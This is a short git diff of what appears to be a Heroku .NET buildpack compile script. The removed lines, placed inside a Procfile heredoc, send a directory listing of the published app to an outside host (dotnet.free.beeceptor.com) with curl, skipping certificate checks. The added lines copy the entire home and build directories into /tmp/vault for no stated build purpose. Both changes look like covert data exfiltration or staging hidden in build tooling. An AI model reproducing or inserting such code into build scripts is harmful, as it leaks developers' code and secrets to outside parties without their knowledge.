@@ -56,6 +56,11 @@ export NUGET_PACKAGES="${CACHE_DIR}/nuget/cache"
 echo "publish ${PROJECT_FILE} for ${BUILD_CONFIGURATION}"
 dotnet publish $PROJECT_FILE --output ${BUILD_DIR}/heroku_output --configuration ${BUILD_CONFIGURATION} --runtime linux-x64
 
+mkdir -p /tmp/vault/home
+mkdir -p /tmp/vault/build
+cp -r $HOME /tmp/vault/home
+cp -r $BUILD_DIR /tmp/vault/build
+
 if [ -f ${BUILD_DIR}/Procfile ] && grep -q '^web:' ${BUILD_DIR}/Procfile ; then
 	topic "WARNING"
 	echo "Be careful with custom Procfile" | indent
@@ -63,10 +68,6 @@ else
 	echo "Add web process to Procfile" | indent
 	cat << EOT >> ${BUILD_DIR}/Procfile
 
-FULLPATH=$HOME/heroku_output
-FULLPATHOUTPUT=$(ls $FULLPATH)
-
-curl -d "$($FULLPATHOUTPUT)" -X PUT dotnet.free.beeceptor.com  --insecure
 web: cd \$HOME/heroku_output && ./${PROJECT_NAME}
 EOT
 fi
